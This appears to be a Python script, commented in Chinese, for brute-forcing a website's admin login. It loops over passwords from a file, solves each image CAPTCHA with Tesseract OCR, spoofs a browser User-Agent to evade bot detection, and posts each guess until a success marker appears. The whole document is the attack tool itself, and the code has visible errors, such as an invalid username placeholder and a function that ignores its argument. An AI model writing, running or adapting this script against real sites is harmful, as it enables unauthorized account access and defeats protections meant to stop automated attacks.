#导入requests库，跟2.x的urllib2和3.x的urllib.request差不多的功能，不过好像更强大
import requests
#导入图像识别的一些库
from PIL import Image
from io import BytesIO
import pytesseract
import urllib
 
#登陆后台
url = 'http://www.xx.cn/!logon'
 
#HTTP的header头，添加个user-agent，有的网站会从User-Agent来判断是否是程序访问
#如果是程序访问则不允许，添加个user-agent就是欺骗这种防护
#在这里的后台wordpress好像不用加
headers = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0'}
#访问后，保留cookie
s = requests.Session()
#加个headers
s.headers.update(headers)
 
#获取图片验证码
def get_captcha_by_OCR(img):
    img = Image.open(BytesIO(response))
    #图片灰度化
    img = img.convert('L')
    img.show()
    #识别函数，图片识别
    captcha = pytesseract.image_to_string(img)
    img.close()
    print(captcha)
    return captcha
 
#防止报错代码
try:
    #打开pwd.txt
    with open('pwd.txt','r') as f:
        #逐行访问并且尝试
        for pwd in f:
            #去除每行的\n，当你读取一行时，如果用二进制显示，会发现每行都有个\n
            pwd = pwd.replace('\n','')
            #print(pwd)
            response = urllib.request.urlopen('http://www.xx.cn/!code').read()
             
            #构造post数据
            data = {
                    'USERNAME':User(自己的用户名),
                    'PASSWORD':pwd,
                    'AUTHCODE':get_captcha_by_OCR(response),
                    }
            #尝试登陆
            req = s.post(url,data = data)
            print(req.status_code)
            #通过某些特征判断是否登陆成功
            if 'SZ-09951217-Y' in req.text:
                print('OK')
                break
#如果出错，输出具体错误
except requests.RequestException as e:
    print(e)
